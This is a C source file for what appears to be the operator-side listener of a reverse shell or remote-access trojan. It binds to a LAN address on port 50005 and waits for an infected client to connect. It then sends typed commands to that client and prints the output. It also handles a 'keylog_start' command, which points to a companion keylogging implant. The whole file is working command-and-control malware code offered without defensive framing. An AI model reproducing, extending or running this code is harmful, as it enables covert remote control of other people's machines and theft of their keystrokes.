#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {

    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int optval = 1;
    socklen_t client_length;

    // Create a TCP socket
    sock = socket(AF_INET, SOCK_STREAM, 0);

    // Check for errors in socket creation
    if (sock < 0) {
        perror("Error creating socket");
        return 1;
    }

    // Set socket options to reuse the address and port immediately after termination
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("Error setting TCP socket options");
        close(sock);
        return 1;
    }

    // Initialize server address structure
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.1.91");  // Server IP address
    server_address.sin_port = htons(50005);  // Server port

    // Bind the socket to the specified address and port
    if (bind(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("Error binding socket");
        close(sock);
        return 1;
    }

    // Listen for incoming connections
    listen(sock, 5);

    // Accept a client connection
    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr*)&client_address, &client_length);

    // Check for errors in accepting the connection
    if (client_socket < 0) {
        perror("Error accepting connection");
        close(sock);
        return 1;
    }

    // Main loop for interacting with the client
    while (1) {
        jump:
        bzero(buffer, sizeof(buffer));
        bzero(response, sizeof(response));

        // Display the shell prompt with the client's IP address
        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));

        // Read user input from stdin
        fgets(buffer, sizeof(buffer), stdin);

        // Remove the newline character from the input
        strtok(buffer, "\n");

        // Send the user input to the client
        write(client_socket, buffer, sizeof(buffer));

        // Check for the "q" command to exit the loop
        if (strncmp("q", buffer, 1) == 0) {
            break;
        }
        // Handle "cd" and "keylog_start" commands by jumping back to the beginning of the loop
        else if (strncmp("cd", buffer, 2) == 0 || strncmp("keylog_start", buffer, 12) == 0) {
            goto jump;
        }
        // Receive and print the response from the client for other commands
        else {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }

    // Close the sockets
    close(client_socket);
    close(sock);

    return 0;  // Exit the program
}
